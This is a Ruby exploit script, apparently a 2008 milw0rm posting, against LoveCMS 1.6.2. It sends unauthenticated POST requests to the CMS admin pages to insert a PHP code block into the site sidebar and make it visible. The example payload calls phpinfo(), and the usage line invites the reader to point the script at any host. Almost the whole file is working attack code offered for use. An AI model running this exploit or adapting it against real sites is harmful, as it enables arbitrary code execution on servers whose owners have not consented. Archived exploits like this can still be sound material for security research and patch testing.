#!/usr/bin/ruby
#
## Exploit by PoMdaPiMp!
## ---------------------
##   pomdapimp(at)gmail(dotcom)
##
##   LoveCMS Exploit Series
##   Episode 1: adding a side block
##
##   Description: add some php into a block container
##                on the side of the site. phpinfo() is called.
##
##   Usage: ./LoveCMS_1_blocks.rb <host>
##   Ex:    ./LoveCMS_1_blocks.rb http://site.com/lovecms/
##
##   Tested on: lovecms_1.6.2_final (MacOS X, Xampp)
#

require 'net/http'
require 'uri'

@host = 'http://127.0.0.1/lovecms_1.6.2_final/lovecms/'

@host = ARGV[0] if ARGV[0]
@host += @host[-1, 1].to_s != '/' ? '/' : ''

if @host
  # --
  puts " + LoveCMS Exploit Series. #1: Adding side blocks."
  puts
  puts " : Attacking host: " + @host

  # --
  # Insert a new block
  res = Net::HTTP.post_form(URI.parse(@host + 'system/admin/addblock.php'),
                            {'submit'=>'1', 'title'=>'H4Ck', 'content' => 'phpinfo();', 'type' => 'php'})
  puts " :: Block inserted."

  # --
  # Build post variable for next step
  post_vars = {'submit' => 1}
  (1..50).each do |id|
    post_vars['position' + id.to_s] = 1
    post_vars['height' + id.to_s] = 1
    post_vars['visible' + id.to_s] = 1
  end
  # Make the block visible
  res = Net::HTTP.post_form(URI.parse(@host + 'system/admin/blocks.php'), post_vars )
  puts " :: Blocks displayed."

  # --
  puts
  puts " - Visit " + @host
end

# milw0rm.com [2008-08-06]
